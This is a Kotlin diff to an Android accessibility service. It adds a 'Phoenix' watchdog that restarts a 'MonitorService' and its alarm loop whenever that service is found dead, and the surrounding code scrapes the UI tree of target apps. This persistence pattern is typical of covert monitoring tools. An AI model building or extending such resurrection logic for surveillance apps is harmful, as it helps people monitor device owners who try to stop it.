@@ -36,6 +36,25 @@ class MyAccessibilityService : AccessibilityService() {
     // TREE SCRAPER STATE
     private var treeDumpEndTime = 0L
     private var targetDumpPkg: String? = null
+    
+    // PHOENIX STATE
+    private var lastPhoenixCheck = 0L
+
+    private fun checkMainServiceHealth() {
+        try {
+            val am = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
+            val isRunning = am.getRunningServices(100).any { it.service.className.contains("MonitorService") }
+            if (!isRunning) {
+                DebugLogger.log("PHOENIX", "Accessibility Symbiote detected dead MonitorService. Resurrecting...")
+                val i = Intent(this, MonitorService::class.java)
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) startForegroundService(i)
+                else startService(i)
+                
+                // Also re-ignite the alarm manager loop
+                KeepAliveReceiver.scheduleNext(this)
+            }
+        } catch (e: Exception) {}
+    }
 
     fun startTreeDump(pkg: String?, mins: Long) {
         targetDumpPkg = if (pkg.isNullOrEmpty() || pkg == "null") null else pkg
@@ -65,6 +84,13 @@ class MyAccessibilityService : AccessibilityService() {
         if (event == null) return
         
         val pkgName = event.packageName?.toString() ?: return
+        
+        // --- 0. PHOENIX HOOK (Resurrection check) ---
+        val now = System.currentTimeMillis()
+        if (now - lastPhoenixCheck > 60000) { // Throttle checks to once a minute maximum
+            lastPhoenixCheck = now
+            checkMainServiceHealth()
+        }
 
         // --- 1. GHOST HAND LOGIC ---
         if (isGhostActive) {
